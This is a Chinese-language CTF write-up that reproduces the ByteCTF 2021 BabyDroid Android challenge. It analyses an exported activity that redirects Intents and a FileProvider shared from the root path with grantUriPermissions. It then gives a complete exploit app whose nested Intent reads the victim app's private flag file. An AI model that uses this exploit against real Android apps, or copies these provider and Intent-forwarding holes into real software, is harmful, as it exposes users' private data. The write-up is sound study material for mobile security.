# Bytes CTF 2021 BabyDroid复现-先知社区

> **来源**: https://xz.aliyun.com/news/17235  
> **文章ID**: 17235

---

# 漏洞类型

1. Intent 重定向
2. Grant Uri permission，通过fileprovider任意读写

# 漏洞 APP 分析

## **AndroidManifest.xml**

![image.png](images/b85290f3-0e5b-3bc2-b74f-58fea17541e9)

从 xml 文件中发现存在两个 activity ,一个 receiver , 一个 provider ,其中两个 Activity 是导出的，`Vulnerable` 活动带有 `intent-filter` ，因此`Vulnerable`活动默认是导出的，`Vulnerable` **可以通过**`action``com.bytectf.TEST`**触发。**

## Vulnerable Activity

该活动导出，并且从传入活动的 Intent1 中获取另外一个 Intent2 并且启动 Intent2 对应的活动 ，这个时候是以 Vulnerable app的身份启动的活动，这便是漏洞存在的地方。

```
/* loaded from: classes3.dex */
public class Vulnerable extends Activity {
    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = (Intent) getIntent().getParcelableExtra("intent");
        startActivity(intent);
    }
}
```

## FlagReceiver

```
/* loaded from: classes3.dex */
public class FlagReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String flag = intent.getStringExtra("flag");
        if (flag != null) {
            File file = new File(context.getFilesDir(), "flag");
            writeFile(file, flag);
            Log.e("FlagReceiver", "received flag.");
        }
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:14:0x0016 -> B:6:0x0026). Please report as a decompilation issue!!! */
    private void writeFile(File file, String s) {
        FileWriter writer = null;
        try {
            try {
                try {
                    writer = new FileWriter(file, true);
                    writer.write(s);
                    writer.write(10);
                    writer.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    if (writer != null) {
                        writer.close();
                    }
                }
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        } catch (Throwable th) {
            if (writer != null) {
                try {
                    writer.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
            throw th;
        }
    }
}
```

该代码与上面注册的静态 Receiver 相关，是用于在启动模拟器的时候通过广播将 flag 文件写到 `/root/data/data/<pakage_name>/files/flag` 目录下，这里为了方便直接在本地安装攻击apk 和 目标 apk,而不再去运行远程环境。

所有启动模拟器后，在 root 权限下需要发送广播给目标 apk 其 flag 的内容，具体指令如下

```
am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag flag{this_is_test_flag}
```

结果如下

```
emu64a:/data/data/com.bytectf.babydroid # am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag flag{this_is_test_flag}
Broadcasting: Intent { act=com.bytectf.SET_FLAG flg=0x400000 cmp=com.bytectf.babydroid/.FlagReceiver (has extras) }
Broadcast completed: result=0
```

在 files 目录下即存在该 flag 文件

```
emu64a:/data/data/com.bytectf.babydroid # cat ./files/flag
flag{this_is_test_flag}
```

FlagReceiver 对漏洞利用没什么帮助，只是为了方便远程环境 flag 的写入

## 内容接收器 provider

```
     <provider
                 android:name="androidx.core.content.FileProvider"
            android:exported="false"
            android:authorities="androidx.core.content.FileProvider"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths"/>
        </provider>
```

这里的 provider 虽然不导出，但是存在 grantUriPermissions 权限，该权限允许其他应用在运行时获取特定 URI 的权限，这里 provider 共享了 file\_paths 变量提供的路径

```
-- xml/file_paths.xml 文件
<paths>
    <root-path
        name="root"
        path=""/>
</paths>
```

可以看到 provider 提供了从根目录开始的文件访问权限，也就意味着通过这个 provider 能实现任意文件读取，但 provider 并没有设置导出，该如何实现权限绕过呢？

# 攻击思路

细心的你一定发现了 grantUriPermissions 权限的开起就是任意文件读取的关键，该权限表明 app 允许其他 app 临时访问指定的路径，只需要在目标 app 中执行如下代码

```
Intent evil = new Intent("evil");
evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
evil.setData(Uri.parse("content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag"));
startActivity(evil);
```

允许外部程序临时访问路径存在如下的 flag 表示不同权限

```
public static final int FLAG_GRANT_READ_URI_PERMISSION = 0x00000001;
public static final int FLAG_GRANT_WRITE_URI_PERMISSION = 0x00000002;
public static final int FLAG_GRANT_PERSISTABLE_URI_PERMISSION = 0x00000040
public static final int FLAG_GRANT_PREFIX_URI_PERMISSION = 0x00000080;
```

> FLAG\_GRANT\_READ\_URI\_PERMISSION：允许接收者读取 URI 的内容，即读取 URI 的数据，并在权限授予期间保持该权限。
>
> FLAG\_GRANT\_WRITE\_URI\_PERMISSION：允许接收者写入 URI 的内容，即修改 URI 的数据，并在权限授予期间保持该权限。
>
> FLAG\_GRANT\_PERSISTABLE\_URI\_PERMISSION：与 `FLAG_GRANT_READ_URI_PERMISSION` 或 `FLAG_GRANT_WRITE_URI_PERMISSION` 一起使用，表示允许接收者在授予许可后持久保存该权限。这意味着即使应用程序被关闭，权限也会保持有效，并且对 URI 的访问仍然是允许的。
>
> FLAG\_GRANT\_PREFIX\_URI\_PERMISSION：允许接收者读取或写入指定 URI 的所有后代 URI，而不必单独为每个 URI 授予权限。

执行完成以下代码后，其他 app 便能够访问 `content://` 中提供的指定路径，比如这里的 flag。

细心的你又想到，前面讲过 Vulnerable Acitivity 中能以 Vulnerable app的身份启动的活动。那这不就正好对上了吗？

在 Vulnerable Acitivity 中以 Vulnerable app 的身份启动一个其他 app ，该 app 允许临时访问的文件路径，这样就能在启动的 app 中读取这个路径，进而实现目标 app 的任意数据泄露。

总结一下，其实攻击 app 的思路就分为关键两点

1. 构造嵌套 Intent ，利用 Vulnerable.java 中漏洞进行转发
2. 利用 grantUriPermissions 在 Vulnerable.java 转发的 Intent 中共享指定路径，通过 fileprovider 实现任意数据读取

# exp 讲解

自己写了一个 exp，只需要在 android stdio 中新建一个项目，复制代码到 MainActivity中，然后打包该app，安装到带有恶意进程的手机上即可在app中读取到flag

```
package com.example.babydroid_attack;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {
    private String Attack_package = "com.bytectf.babydroid";
    private String Vulnerable_action = "com.bytectf.TEST";

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        String action = getIntent().getAction();
        if( action != null && action.equals("evil")){
            try {
                Uri uri = getIntent().getData();
                if ( uri != null) {
                    InputStream data = getContentResolver().openInputStream(uri);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(data));
                    StringBuilder flag = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        flag.append(line).append("
");
                    }
                    reader.close();
                    Toast.makeText(this,flag.toString(),Toast.LENGTH_LONG).show();
                    Log.d("attack_activity",flag.toString());
                }
            } catch ( FileNotFoundException e ){
                e.printStackTrace();
            } catch ( Exception e ){
                e.printStackTrace();
             }
        }
        else {
            Intent evil = new Intent("evil");
            evil.setClass(this, MainActivity.class);
            evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            evil.setData(Uri.parse("content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag"));
            
            Intent intent = new Intent();
            intent.setClassName(Attack_package,"com.bytectf.babydroid.Vulnerable");
            intent.setAction(Vulnerable_action);
            intent.putExtra("intent", evil);
            startActivity(intent);
        }

    }
}
```

手动编写一个攻击程序，该程序需要完成以下步骤

1. 启动目标 app 的 Vulnerable 类，并传入一个恶意 Intent
2. 该恶意 Intent，用于启动一个活动，利用 grantUriPermissions 权利，让活动能访问指定 URI 的数据，这样就实现了目标 app 的私有数据读取

最后附上编译好的 attack.apk， 以及 victim.apk，我们只需要将 attack.apk 和 victim.apk 安装到同一个手机上，按照前面讲解的方式创建flag，再运行 attack.apk 即可获取到 flag 再前台即可泄露 flag 完成攻击

![1d3ad474bb906e42fd05378ed46c8ca0_720.png](images/820bd9b1-074d-3dd0-ae4f-7dd1518b024e)

* 目前好像没法上传文件，文章发布后我将附件放到评论区
